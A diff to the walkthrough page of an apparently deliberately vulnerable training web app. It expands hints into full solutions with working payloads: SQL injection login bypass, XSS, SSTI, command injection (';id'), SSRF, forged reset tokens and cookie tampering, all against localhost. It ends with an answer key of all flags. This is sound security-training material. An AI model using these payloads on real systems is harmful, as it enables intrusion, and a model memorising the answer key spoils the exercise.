@@ -4,322 +4,500 @@
 <article class="guide">
   <header class="guide-header">
     <h1>SecureCorp Lab Guide</h1>
-    <p>Work through each phase on your own. Click <strong>Hints</strong> only when you are stuck.</p>
+    <p>Follow the phases in order. Each phase tells you <strong>what to do</strong>, <strong>what to collect</strong>, and has expandable <strong>step-by-step hints</strong> if you get stuck.</p>
+    <p class="guide-meta">Hidden pages: <code>/check</code> (submit findings) · <code>/guide</code> (this page)</p>
   </header>
 
+  <section class="guide-phase guide-toc">
+    <h2>Progress checklist — 19 items</h2>
+    <p>Every labeled value you find maps to a field on <code>/check</code>. Collect these as you go:</p>
+    <div class="checklist-grid">
+      <div><strong>Auth</strong> Username · Bypass method · Admin password · Dashboard flag · Internal token · Cookie role</div>
+      <div><strong>Web attacks</strong> XSS canary · Stored XSS (yes) · IDOR · LFI · CMDi · SSRF · Backup flag · Reset flag · SSTI · Profile flag · Report SQLi</div>
+      <div><strong>Host</strong> Host shell flag · Host root flag</div>
+    </div>
+  </section>
+
   <section class="guide-phase">
-    <h2>Setup</h2>
+    <h2>Before you start</h2>
     <pre class="guide-code">python3 -m venv .venv
 source .venv/bin/activate
 pip install -r requirements.txt
 VULNLAB_RESET=1 python app.py</pre>
-    <p>Open <a href="{{ url_for('home') }}">http://127.0.0.1:5000</a> and explore the portal.</p>
+    <p>Open <a href="{{ url_for('home') }}">http://127.0.0.1:5000</a></p>
+    <p><strong>Recommended tools:</strong> Browser DevTools (Network + Application tabs), Burp Suite or OWASP ZAP, curl.</p>
   </section>
 
+  <!-- PHASE 1 -->
   <section class="guide-phase">
     <h2>Phase 1 — Reconnaissance</h2>
-    <p><strong>Goal:</strong> Map the application before attacking anything.</p>
-    <ol>
-      <li>Browse the site like a new employee. Note pages, forms, and links.</li>
-      <li>Look beyond the UI — source code, machine-readable files, common paths.</li>
-      <li>Find APIs, debug endpoints, or leaked configuration.</li>
-      <li>Record usernames, fields, cookies, and error messages.</li>
+    <p class="guide-goal"><strong>Goal:</strong> Map every page, API, and leaked file before attacking.</p>
+
+    <ol class="guide-steps">
+      <li>Click through every link on the homepage and navigation bar. Write down each URL.</li>
+      <li>On the sign-in page, right-click → <strong>View Page Source</strong>. Look for comments and hidden fields.</li>
+      <li>Visit <code>/robots.txt</code> in your browser — note every disallowed path.</li>
+      <li>Try <code>/api/status</code> and read the JSON response.</li>
+      <li>Open <strong>Company Documents</strong> and follow links to the file viewer.</li>
     </ol>
-    <p><strong>Done when:</strong> You have a list of interesting URLs and unexpected sensitive data.</p>
+
+    <div class="guide-collect">
+      <strong>Collect now:</strong> Backup config flag · XSS canary flag (both in backup file)
+    </div>
+    <p class="guide-done"><strong>Done when:</strong> You have read <code>/backup/config.bak</code> and saved both labeled values from it.</p>
 
     <details class="guide-hints">
-      <summary>Hints</summary>
+      <summary>Step-by-step hints — Phase 1</summary>
       <div class="guide-hint-body">
-        <details>
-          <summary>Where to start looking</summary>
-          <p>View source on the sign-in page. Fetch <code>/robots.txt</code>. Try <code>/api/status</code> for JSON.</p>
+        <details open>
+          <summary>1. Find robots.txt</summary>
+          <ol>
+            <li>Go to <code>http://127.0.0.1:5000/robots.txt</code></li>
+            <li>Read the <code>Disallow:</code> lines — these are paths the site owner tried to hide</li>
+            <li>Note <code>/backup/</code>, <code>/internal/</code>, <code>/sys/</code>, <code>/api/user/</code>, <code>/api/reports</code></li>
+          </ol>
         </details>
         <details>
-          <summary>Leaked configuration</summary>
-          <p><code>robots.txt</code> references a path under <code>/backup/</code>. Read the full file — it contains labeled values for later.</p>
+          <summary>2. Read the leaked backup config</summary>
+          <ol>
+            <li>Go to <code>http://127.0.0.1:5000/backup/config.bak</code></li>
+            <li>Find lines labeled <strong>Backup config flag</strong> and <strong>XSS canary flag</strong></li>
+            <li>Copy both <code>VULN{...}</code> values — you will enter them on <code>/check</code> later</li>
+            <li>Also note <code>INTERNAL_HEALTH_URL</code> — you will need it in Phase 7</li>
+          </ol>
+        </details>
+        <details>
+          <summary>3. Browse documents</summary>
+          <ol>
+            <li>Click <strong>Documents</strong> in the nav (or go to <code>/documents</code>)</li>
+            <li>Click each filename — they open in <code>/files?name=...</code></li>
+            <li>Read <code>deployment_notes.txt</code> — it explains host access (Phase 9)</li>
+          </ol>
+        </details>
+        <details>
+          <summary>4. Guest account in page source</summary>
+          <ol>
+            <li>Go to <code>/login</code> → View Source</li>
+            <li>Search for <code>guest</code> — a developer comment reveals test credentials</li>
+          </ol>
         </details>
       </div>
     </details>
   </section>
 
+  <!-- PHASE 2 -->
   <section class="guide-phase">
-    <h2>Phase 2 — Authentication &amp; sessions</h2>
-    <p><strong>Goal:</strong> Get past login and reach administrator content.</p>
-    <ol>
-      <li>Try valid and invalid credentials. Compare error messages.</li>
-      <li>Intercept the login request. Inspect every parameter sent.</li>
-      <li>After login, examine cookies and session storage.</li>
-      <li>Reach the administrator resources on the dashboard.</li>
+    <h2>Phase 2 — Login &amp; admin access</h2>
+    <p class="guide-goal"><strong>Goal:</strong> Reach the administrator dashboard and copy all labeled secrets.</p>
+
+    <ol class="guide-steps">
+      <li>Sign in with wrong passwords for <code>admin</code> vs <code>notreal</code> — compare error messages.</li>
+      <li>Intercept the login POST — find the hidden <code>role</code> field.</li>
+      <li>Get admin dashboard access (three methods below — pick one).</li>
+      <li>Open <strong>My Dashboard</strong> as admin and copy every labeled value.</li>
     </ol>
-    <p><strong>Done when:</strong> You can view the admin panel and recorded its labeled values.</p>
+
+    <div class="guide-collect">
+      <strong>Collect now:</strong> Admin password · Dashboard flag · Internal token · Cookie role (<code>admin</code>) · Username · Bypass method
+    </div>
+    <p class="guide-done"><strong>Done when:</strong> Dashboard shows "Administrator resources" with four labeled items.</p>
 
     <details class="guide-hints">
-      <summary>Hints</summary>
+      <summary>Step-by-step hints — Phase 2</summary>
       <div class="guide-hint-body">
-        <details>
-          <summary>Login interception</summary>
-          <p>The sign-in POST includes hidden fields. Capture and edit the request in Burp, ZAP, or DevTools.</p>
+        <details open>
+          <summary>Method A — Hidden role field (easiest)</summary>
+          <ol>
+            <li>Open Burp/ZAP or DevTools → Network tab</li>
+            <li>Go to <code>/login</code>, enter any username/password, submit</li>
+            <li>Find the POST request — body looks like: <code>username=...&amp;password=...&amp;role=user</code></li>
+            <li>Change <code>role=user</code> to <code>role=admin</code></li>
+            <li>Forward/resend the request → you land on dashboard as admin</li>
+            <li>On <code>/check</code>, set Bypass method to <code>hidden role</code></li>
+          </ol>
         </details>
         <details>
-          <summary>Bypassing authentication</summary>
-          <p>Input is concatenated into a SQL query. Break out of the string in the username field. Combine with role tampering or cookie editing for admin access.</p>
+          <summary>Method B — SQL injection</summary>
+          <ol>
+            <li>On login, set username to: <code>' OR '1'='1' --</code></li>
+            <li>Password can be anything</li>
+            <li>Also change hidden <code>role</code> to <code>admin</code> via intercept (SQLi alone gives user role)</li>
+            <li>On <code>/check</code>, set Bypass method to <code>sqli</code></li>
+          </ol>
+        </details>
+        <details>
+          <summary>Method C — Cookie tampering</summary>
+          <ol>
+            <li>Log in normally as <code>guest</code> / <code>guest123</code></li>
+            <li>DevTools → Application → Cookies → copy <code>vulnlab_session</code></li>
+            <li>Decode URL-safe base64 → JSON like <code>{"username":"guest","role":"user"}</code></li>
+            <li>Change to <code>{"username":"guest","role":"admin"}</code>, re-encode, replace cookie</li>
+            <li>Reload <code>/dashboard</code></li>
+            <li>On <code>/check</code>, set Bypass method to <code>cookie tamper</code> and Cookie role to <code>admin</code></li>
+          </ol>
+          <pre class="guide-code">python3 -c "import base64,json; p={'username':'guest','role':'admin'}; print(base64.urlsafe_b64encode(json.dumps(p,separators=(',',':')).encode()).decode().rstrip('='))"</pre>
         </details>
         <details>
           <summary>User enumeration</summary>
-          <p>Failed logins return different errors for unknown vs. known usernames. A JSON endpoint accepts a <code>username</code> parameter.</p>
-        </details>
-        <details>
-          <summary>Cookie tampering</summary>
-          <p>The <code>vulnlab_session</code> cookie is URL-safe base64 JSON, not HttpOnly. Decode, set <code>role</code> to admin, re-encode, replace, reload.</p>
-        </details>
-        <details>
-          <summary>Test credentials</summary>
-          <p>Check the HTML comment on the sign-in page for a guest account.</p>
+          <ol>
+            <li>Try login with username <code>admin</code> + wrong password → "Invalid password for that account."</li>
+            <li>Try username <code>fakeuser</code> → "Unknown username."</li>
+            <li>Or: <code>curl "http://127.0.0.1:5000/api/check_user?username=admin"</code></li>
+          </ol>
         </details>
       </div>
     </details>
   </section>
 
+  <!-- PHASE 3 -->
   <section class="guide-phase">
-    <h2>Phase 3 — Cross-site scripting</h2>
-    <p><strong>Goal:</strong> Trigger reflected and stored XSS.</p>
-    <ol>
-      <li>Find a page that echoes input in the response.</li>
-      <li>Find a page that stores and re-displays input.</li>
-      <li>Verify execution with a harmless payload.</li>
-      <li>Collect labeled XSS values.</li>
+    <h2>Phase 3 — XSS (cross-site scripting)</h2>
+    <p class="guide-goal"><strong>Goal:</strong> Prove reflected and stored XSS. XSS canary flag is from Phase 1 backup file.</p>
+
+    <ol class="guide-steps">
+      <li>Directory search — submit HTML/script in the search box, see if it executes.</li>
+      <li>Feedback — post a script tag, reload page, confirm it runs.</li>
+      <li>Mark Stored XSS as <strong>Yes</strong> on <code>/check</code>.</li>
     </ol>
-    <p><strong>Done when:</strong> Both XSS types work and labeled values are recorded.</p>
+
+    <div class="guide-collect">
+      <strong>Collect now:</strong> XSS canary flag (backup config) · Stored XSS = yes
+    </div>
 
     <details class="guide-hints">
-      <summary>Hints</summary>
+      <summary>Step-by-step hints — Phase 3</summary>
       <div class="guide-hint-body">
-        <details>
+        <details open>
           <summary>Reflected XSS</summary>
-          <p>The employee directory search reflects your query without encoding.</p>
+          <ol>
+            <li>Go to <strong>Directory</strong> (<code>/search</code>)</li>
+            <li>Search for: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+            <li>If an alert pops up, reflected XSS works</li>
+          </ol>
         </details>
         <details>
           <summary>Stored XSS</summary>
-          <p>The feedback form stores messages and renders HTML without sanitization.</p>
-        </details>
-        <details>
-          <summary>XSS flag location</summary>
-          <p>One labeled value is in the backup config from Phase 1, not on the search page.</p>
+          <ol>
+            <li>Go to <strong>Feedback</strong></li>
+            <li>In the message field enter: <code>&lt;script&gt;alert('stored')&lt;/script&gt;</code></li>
+            <li>Submit → reload page → alert should fire again</li>
+            <li>On <code>/check</code>, set Stored XSS to <strong>Yes</strong></li>
+          </ol>
         </details>
       </div>
     </details>
   </section>
 
+  <!-- PHASE 4 SSTI -->
   <section class="guide-phase">
-    <h2>Phase 4 — IDOR</h2>
-    <p><strong>Goal:</strong> Read another user's profile by changing an ID.</p>
-    <ol>
-      <li>Find an endpoint returning user profile data.</li>
-      <li>Check whether ownership is validated.</li>
-      <li>Enumerate IDs until you find sensitive admin fields.</li>
+    <h2>Phase 4 — SSTI (server-side template injection)</h2>
+    <p class="guide-goal"><strong>Goal:</strong> Inject template syntax in the directory search to leak a server-side flag.</p>
+
+    <ol class="guide-steps">
+      <li>Confirm template evaluation with <code>{{7*7}}</code> — should show <code>49</code>.</li>
+      <li>Leak the flag variable with <code>{{ssti_flag}}</code>.</li>
     </ol>
-    <p><strong>Done when:</strong> You have a labeled value from another user's profile.</p>
+
+    <div class="guide-collect"><strong>Collect now:</strong> SSTI flag</div>
 
     <details class="guide-hints">
-      <summary>Hints</summary>
+      <summary>Step-by-step hints — Phase 4</summary>
       <div class="guide-hint-body">
-        <details>
-          <summary>IDOR endpoint</summary>
-          <p>Try <code>/api/user/1</code>, <code>/api/user/2</code>, <code>/api/user/3</code>…</p>
+        <details open>
+          <summary>Full walkthrough</summary>
+          <ol>
+            <li>Go to <code>/search?q={{7*7}}</code></li>
+            <li>You should see "Template preview: 49" — the server evaluated your input</li>
+            <li>Now try <code>/search?q={{ssti_flag}}</code></li>
+            <li>Copy the <code>VULN{...}</code> value labeled <strong>SSTI flag</strong></li>
+          </ol>
         </details>
       </div>
     </details>
   </section>
 
+  <!-- PHASE 5 IDOR -->
   <section class="guide-phase">
-    <h2>Phase 5 — Local file read</h2>
-    <p><strong>Goal:</strong> Read a server file you should not access.</p>
-    <ol>
-      <li>Find a filename/path parameter.</li>
-      <li>Try normal names, then traversal sequences.</li>
-      <li>Collect labeled values from the response.</li>
+    <h2>Phase 5 — IDOR</h2>
+    <p class="guide-goal"><strong>Goal:</strong> Read other users' profiles by changing the ID in the URL.</p>
+
+    <ol class="guide-steps">
+      <li>Visit <code>/api/user/1</code>, then <code>/2</code>, then <code>/3</code>.</li>
+      <li>Find the admin profile and copy the labeled <code>api_key</code>.</li>
     </ol>
-    <p><strong>Done when:</strong> You extracted a labeled flag from a protected file.</p>
+
+    <div class="guide-collect"><strong>Collect now:</strong> IDOR flag</div>
 
     <details class="guide-hints">
-      <summary>Hints</summary>
+      <summary>Step-by-step hints — Phase 5</summary>
       <div class="guide-hint-body">
-        <details>
-          <summary>File viewer</summary>
-          <p>Look for <code>/files?name=</code>. Try filenames mentioned elsewhere first.</p>
+        <details open>
+          <summary>Full walkthrough</summary>
+          <ol>
+            <li>Open <code>http://127.0.0.1:5000/api/user/1</code> in browser or curl</li>
+            <li>Repeat for IDs 2 and 3</li>
+            <li>User 3 (admin) has <code>api_key</code> containing the IDOR flag</li>
+            <li>No login required — classic insecure direct object reference</li>
+          </ol>
         </details>
       </div>
     </details>
   </section>
 
+  <!-- PHASE 6 REPORT SQLi -->
   <section class="guide-phase">
-    <h2>Phase 6 — Command injection</h2>
-    <p><strong>Goal:</strong> Run commands via a server-side utility.</p>
-    <ol>
-      <li>Find a diagnostic tool that runs shell commands.</li>
-      <li>Inject metacharacters and read the output.</li>
-      <li>Collect the labeled injection flag.</li>
+    <h2>Phase 6 — Report API SQL injection</h2>
+    <p class="guide-goal"><strong>Goal:</strong> SQL-inject the department filter on the hidden reports API.</p>
+
+    <ol class="guide-steps">
+      <li>Find <code>/api/reports</code> (listed in robots.txt).</li>
+      <li>Try normal dept values, then injection to return all rows.</li>
+      <li>When 3+ users returned, the response includes the report flag.</li>
     </ol>
-    <p><strong>Done when:</strong> You have the command injection label from tool output.</p>
+
+    <div class="guide-collect"><strong>Collect now:</strong> Report SQLi flag</div>
 
     <details class="guide-hints">
-      <summary>Hints</summary>
+      <summary>Step-by-step hints — Phase 6</summary>
       <div class="guide-hint-body">
-        <details>
-          <summary>Which tool</summary>
-          <p>Network Tools passes input directly to a shell.</p>
-        </details>
-        <details>
-          <summary>Injection characters</summary>
-          <p>Append <code>;</code>, <code>|</code>, <code>&amp;</code>, backticks, or <code>$()</code> after a hostname.</p>
+        <details open>
+          <summary>Full walkthrough</summary>
+          <ol>
+            <li>Try: <code>/api/reports?dept=SOC</code> — returns one user</li>
+            <li>Inject: <code>/api/reports?dept=' OR '1'='1' --</code></li>
+            <li>URL-encode if using browser: <code>%27+OR+%271%27%3D%271%27+--</code></li>
+            <li>Response includes <code>report_flag</code> when all users are returned</li>
+          </ol>
         </details>
       </div>
     </details>
   </section>
 
+  <!-- PHASE 7 LFI -->
   <section class="guide-phase">
-    <h2>Phase 7 — SSRF</h2>
-    <p><strong>Goal:</strong> Make the server fetch an internal URL.</p>
-    <ol>
-      <li>Find a server-side URL fetch feature.</li>
-      <li>Identify internal-only endpoints from earlier recon.</li>
-      <li>Pass the internal URL to the fetch tool.</li>
-      <li>Read the labeled flag in the response.</li>
+    <h2>Phase 7 — Local file read</h2>
+    <p class="guide-goal"><strong>Goal:</strong> Read protected files via the document viewer.</p>
+
+    <ol class="guide-steps">
+      <li>Go to <code>/files?name=backup_flag.txt</code> (linked from Documents page).</li>
+      <li>Copy the labeled LFI flag from the response.</li>
     </ol>
-    <p><strong>Done when:</strong> You have the SSRF label from an internal endpoint.</p>
+
+    <div class="guide-collect"><strong>Collect now:</strong> LFI flag</div>
 
     <details class="guide-hints">
-      <summary>Hints</summary>
+      <summary>Step-by-step hints — Phase 7</summary>
       <div class="guide-hint-body">
-        <details>
-          <summary>URL preview tool</summary>
-          <p>Linked from Network Tools. Accepts a <code>url</code> query parameter.</p>
-        </details>
-        <details>
-          <summary>Internal target</summary>
-          <p>Use <code>INTERNAL_HEALTH_URL</code> from the backup config so the server fetches it.</p>
+        <details open>
+          <summary>Full walkthrough</summary>
+          <ol>
+            <li><code>curl "http://127.0.0.1:5000/files?name=backup_flag.txt"</code></li>
+            <li>Also read <code>deployment_notes.txt</code> — needed for Phase 11</li>
+          </ol>
         </details>
       </div>
     </details>
   </section>
 
+  <!-- PHASE 8 CMDi -->
   <section class="guide-phase">
-    <h2>Phase 8 — Password reset</h2>
-    <p><strong>Goal:</strong> Approve a reset without the email flow.</p>
-    <ol>
-      <li>Generate a reset link for a known user.</li>
-      <li>Determine whether the token is random or predictable.</li>
-      <li>Forge a token for an admin and visit the reset URL.</li>
+    <h2>Phase 8 — Command injection</h2>
+    <p class="guide-goal"><strong>Goal:</strong> Run extra commands through the network ping tool.</p>
+
+    <ol class="guide-steps">
+      <li>Go to <strong>Network Tools</strong> (<code>/tools/ping</code>).</li>
+      <li>Enter a hostname with a shell metacharacter appended.</li>
+      <li>Read the labeled flag in the debug output.</li>
     </ol>
-    <p><strong>Done when:</strong> You have the password reset label.</p>
+
+    <div class="guide-collect"><strong>Collect now:</strong> Command injection flag</div>
 
     <details class="guide-hints">
-      <summary>Hints</summary>
+      <summary>Step-by-step hints — Phase 8</summary>
       <div class="guide-hint-body">
-        <details>
-          <summary>Token format</summary>
-          <p>URL-safe base64 of the username — no secret key.</p>
+        <details open>
+          <summary>Full walkthrough</summary>
+          <ol>
+            <li>Host field: <code>127.0.0.1; id</code></li>
+            <li>Or use curl: <code>curl -X POST http://127.0.0.1:5000/tools/ping -d "host=127.0.0.1;id"</code></li>
+            <li>Output includes the command injection flag after <code>[debug]</code></li>
+          </ol>
         </details>
       </div>
     </details>
   </section>
 
+  <!-- PHASE 9 SSRF -->
   <section class="guide-phase">
-    <h2>Phase 9 — Host compromise</h2>
-    <p><strong>Goal:</strong> Get a shell on the server and escalate to root.</p>
-    <ol>
-      <li>Find documentation about the host environment (deployment notes, internal APIs).</li>
-      <li>Obtain the host console token from an internal-only endpoint.</li>
-      <li>Open the hidden system console and run commands as the web process user.</li>
-      <li>Read the user proof flag, then escalate privileges to read root's flag.</li>
+    <h2>Phase 9 — SSRF</h2>
+    <p class="guide-goal"><strong>Goal:</strong> Make the server fetch an internal URL you cannot reach directly.</p>
+
+    <ol class="guide-steps">
+      <li>Get <code>INTERNAL_HEALTH_URL</code> from the backup config (Phase 1).</li>
+      <li>Open URL Preview tool (link on Network Tools page).</li>
+      <li>Paste the internal URL — read <code>ssrf_flag</code> from the JSON response.</li>
     </ol>
-    <p><strong>Done when:</strong> You have both host shell and host root flags.</p>
+
+    <div class="guide-collect"><strong>Collect now:</strong> SSRF flag · host console token (same response)</div>
 
     <details class="guide-hints">
-      <summary>Hints</summary>
+      <summary>Step-by-step hints — Phase 9</summary>
       <div class="guide-hint-body">
-        <details>
-          <summary>Deployment documentation</summary>
-          <p>Read <code>deployment_notes.txt</code> via the file viewer. It mentions the sysconsole and internal health check.</p>
-        </details>
-        <details>
-          <summary>Console token</summary>
-          <p>SSRF to <code>/internal/health</code> returns <code>host_console_token</code> and <code>host_console_url</code>.</p>
-        </details>
-        <details>
-          <summary>System console</summary>
-          <p>Visit <code>/sys/console?token=TOKEN</code> — blocked in <code>robots.txt</code>. Run <code>help</code>, then explore with <code>ls</code> and <code>cat</code>.</p>
-        </details>
-        <details>
-          <summary>Privilege escalation</summary>
-          <p>Read <code>home/www-data/notes.txt</code> on the console. www-data can run <code>sudo cat root/flag.txt</code> without a password.</p>
+        <details open>
+          <summary>Full walkthrough</summary>
+          <ol>
+            <li>From backup config copy: <code>http://127.0.0.1:5000/internal/health</code></li>
+            <li>Go to URL Preview (<code>/fetch</code>) or: <code>/fetch?url=http://127.0.0.1:5000/internal/health</code></li>
+            <li>The <strong>server</strong> fetches it — you see JSON with <code>ssrf_flag</code> and <code>host_console_token</code></li>
+            <li>Save both — you need the token for Phase 11</li>
+          </ol>
         </details>
       </div>
     </details>
   </section>
 
+  <!-- PHASE 10 RESET -->
   <section class="guide-phase">
-    <h2>Phase 10 — Submission</h2>
-    <p><strong>Goal:</strong> Score 16/16 on the hidden form.</p>
-    <ol>
-      <li>Collect every labeled value from the site and host.</li>
-      <li>Find the submission form (not linked in navigation).</li>
-      <li>Enter each value under its matching label.</li>
-      <li>Submit <strong>Yes</strong> for Stored XSS if your payload ran.</li>
+    <h2>Phase 10 — Password reset</h2>
+    <p class="guide-goal"><strong>Goal:</strong> Forge a valid reset token without email access.</p>
+
+    <ol class="guide-steps">
+      <li>Generate a reset link for username <code>admin</code>.</li>
+      <li>Notice the token pattern — it's predictable.</li>
+      <li>Visit the reset URL and copy the labeled flag.</li>
     </ol>
-    <p><strong>Done when:</strong> The form shows 16/16 complete.</p>
+
+    <div class="guide-collect"><strong>Collect now:</strong> Password reset flag</div>
 
     <details class="guide-hints">
-      <summary>Hints</summary>
+      <summary>Step-by-step hints — Phase 10</summary>
       <div class="guide-hint-body">
-        <details>
-          <summary>Submission URL</summary>
-          <p><a href="{{ url_for('check') }}">/check</a></p>
-        </details>
-        <details>
-          <summary>Bypass method values</summary>
-          <p><code>sqli</code>, <code>sql injection</code>, <code>hidden role</code>, <code>role tamper</code>, <code>cookie</code>, <code>cookie tamper</code></p>
+        <details open>
+          <summary>Full walkthrough</summary>
+          <ol>
+            <li>Go to <strong>Reset Password</strong>, enter username <code>admin</code>, submit</li>
+            <li>Token = URL-safe base64 of username: <code>YWRtaW4</code> for admin</li>
+            <li>Visit: <code>/reset?user=admin&amp;token=YWRtaW4</code></li>
+            <li>Copy the password reset flag from the success message</li>
+          </ol>
         </details>
       </div>
     </details>
   </section>
 
+  <!-- PHASE 11 PROFILE -->
+  <section class="guide-phase">
+    <h2>Phase 11 — Profile escalation</h2>
+    <p class="guide-goal"><strong>Goal:</strong> Tamper with a hidden field on the profile form to escalate access.</p>
+
+    <ol class="guide-steps">
+      <li>Log in (any account).</li>
+      <li>Go to <strong>My Dashboard</strong> then edit profile (or visit <code>/profile</code> while logged in).</li>
+      <li>Intercept the save request and change the hidden <code>access_level</code> field.</li>
+    </ol>
+
+    <div class="guide-collect"><strong>Collect now:</strong> Profile escalation flag</div>
+
+    <details class="guide-hints">
+      <summary>Step-by-step hints — Phase 11</summary>
+      <div class="guide-hint-body">
+        <details open>
+          <summary>Full walkthrough</summary>
+          <ol>
+            <li>Sign in as <code>guest</code> / <code>guest123</code></li>
+            <li>Go to <code>/profile</code></li>
+            <li>Intercept POST — body includes hidden <code>access_level=standard</code></li>
+            <li>Change to <code>access_level=admin</code>, forward request</li>
+            <li>Page shows the profile escalation flag</li>
+          </ol>
+        </details>
+      </div>
+    </details>
+  </section>
+
+  <!-- PHASE 12 HOST -->
+  <section class="guide-phase">
+    <h2>Phase 12 — Host compromise (shell + root)</h2>
+    <p class="guide-goal"><strong>Goal:</strong> Get a web shell on the server and read both host flags.</p>
+
+    <ol class="guide-steps">
+      <li>Use <code>host_console_token</code> from Phase 9.</li>
+      <li>Open <code>/sys/console?token=YOUR_TOKEN</code>.</li>
+      <li>Run <code>help</code>, then <code>cat home/www-data/user_flag.txt</code>.</li>
+      <li>Run <code>sudo cat root/flag.txt</code> for root flag.</li>
+    </ol>
+
+    <div class="guide-collect"><strong>Collect now:</strong> Host shell flag · Host root flag</div>
+
+    <details class="guide-hints">
+      <summary>Step-by-step hints — Phase 12</summary>
+      <div class="guide-hint-body">
+        <details open>
+          <summary>Full walkthrough</summary>
+          <ol>
+            <li><code>http://127.0.0.1:5000/sys/console?token=c0ns0l3_t0k_8e1a4f</code> (replace with your token)</li>
+            <li>Type <code>ls</code> to browse the simulated filesystem</li>
+            <li><code>cat home/www-data/user_flag.txt</code> → host shell flag</li>
+            <li><code>cat home/www-data/notes.txt</code> → explains sudo privesc</li>
+            <li><code>sudo cat root/flag.txt</code> → host root flag</li>
+          </ol>
+        </details>
+      </div>
+    </details>
+  </section>
+
+  <!-- PHASE 13 SUBMIT -->
+  <section class="guide-phase">
+    <h2>Phase 13 — Submit everything</h2>
+    <p class="guide-goal"><strong>Goal:</strong> Score 19/19 on the hidden submission form.</p>
+
+    <ol class="guide-steps">
+      <li>Go to <code>/check</code> (not linked anywhere on the site).</li>
+      <li>Enter every labeled value under its matching field name.</li>
+      <li>Stored XSS → <strong>Yes</strong>. Cookie role → <code>admin</code>.</li>
+      <li>Submit and verify 19/19 complete.</li>
+    </ol>
+
+    <details class="guide-hints">
+      <summary>Step-by-step hints — Phase 13</summary>
+      <div class="guide-hint-body">
+        <details open>
+          <summary>Submission form</summary>
+          <ol>
+            <li><a href="{{ url_for('check') }}">Open /check</a></li>
+            <li>Field labels match exactly what you saw on the site (e.g. "Dashboard flag", "SSTI flag")</li>
+            <li>Bypass method accepts: <code>sqli</code>, <code>hidden role</code>, <code>cookie tamper</code>, etc.</li>
+          </ol>
+        </details>
+      </div>
+    </details>
+  </section>
+
+  <!-- SOLUTIONS -->
   <section class="guide-phase">
     <h2>Solutions (spoilers)</h2>
-
     <details class="guide-hints guide-spoilers">
-      <summary>All flags and secrets</summary>
+      <summary>All 19 flags — click to reveal</summary>
       <div class="guide-hint-body">
-        <pre class="guide-code">admin_password: Sup3rS3cr3t!
+        <pre class="guide-code">Username: guest (or admin, analyst, anonymous)
+Bypass method: hidden role / sqli / cookie tamper
+Admin password: Sup3rS3cr3t!
 Dashboard flag: VULN{1nt3rc3pt_4nd_1nj3ct}
 Internal token: tok_live_7f3a9c2e
+Cookie role: admin
 XSS canary flag: VULN{xss_p4yl0ad_fired}
+Stored XSS: Yes
+SSTI flag: VULN{ssti_t3mplat3}
 IDOR flag: VULN{id0r_us3r_l33k}
+Report SQLi flag: VULN{r3p0rt_sqli}
 LFI flag: VULN{l0cal_f1le_r3ad}
 Command injection flag: VULN{c0mm4nd_1nj3ct}
 SSRF flag: VULN{ssrf_1ntern4l}
 Backup config flag: VULN{b4ckup_expos3d}
 Password reset flag: VULN{w34k_r3s3t_t0k3n}
+Profile escalation flag: VULN{pr0f1l3_3sc4l4te}
 Host shell flag: VULN{sh3ll_4cc3ss}
 Host root flag: VULN{r00t_0n_b0x}</pre>
-      </div>
-    </details>
-
-    <details class="guide-hints guide-spoilers">
-      <summary>Exploit commands</summary>
-      <div class="guide-hint-body">
-        <pre class="guide-code">curl -s http://127.0.0.1:5000/robots.txt
-curl -s http://127.0.0.1:5000/backup/config.bak
-curl -s http://127.0.0.1:5000/api/user/3
-curl -s "http://127.0.0.1:5000/files?name=backup_flag.txt"
-curl -s "http://127.0.0.1:5000/files?name=deployment_notes.txt"
-curl -s "http://127.0.0.1:5000/fetch?url=http://127.0.0.1:5000/internal/health"
-curl -s "http://127.0.0.1:5000/sys/console?token=c0ns0l3_t0k_8e1a4f"
-# on console: cat home/www-data/user_flag.txt
-# on console: sudo cat root/flag.txt
-curl -s -X POST http://127.0.0.1:5000/tools/ping -d "host=127.0.0.1;id"
-python3 -c "import base64; print(base64.urlsafe_b64encode(b'admin').decode().rstrip('='))"
-curl -s "http://127.0.0.1:5000/reset?user=admin&token=YWRtaW4"</pre>
       </div>
     </details>
   </section>
